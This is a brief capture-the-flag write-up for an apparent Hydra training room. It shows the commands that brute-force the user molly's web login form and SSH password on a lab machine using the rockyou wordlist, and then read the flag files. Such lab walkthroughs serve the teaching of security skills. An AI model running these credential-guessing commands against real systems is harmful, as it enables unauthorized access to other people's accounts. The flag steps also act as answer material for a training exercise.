
# Hydra writeup

### Task 1 
#### Use Hydra to bruteforce molly's web password. What is flag 1?

- To complete first task we need to use Hydra tool. The command to bruteforce login to website will be:
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.184.83 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```
- Then login to page using login and password and you will get the flag

### Task 2
#### Use Hydra to bruteforce molly's SSH password. What is flag 2?
- To complete second task we have to change our command to bruteforce SSH:
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.184.83 -t 4 ssh
```
- Then we have to ssh to given machine using password we bruteforced.
```
ssh molly@<MACHINE-IP>
```
- Then simply cat flag2.txt



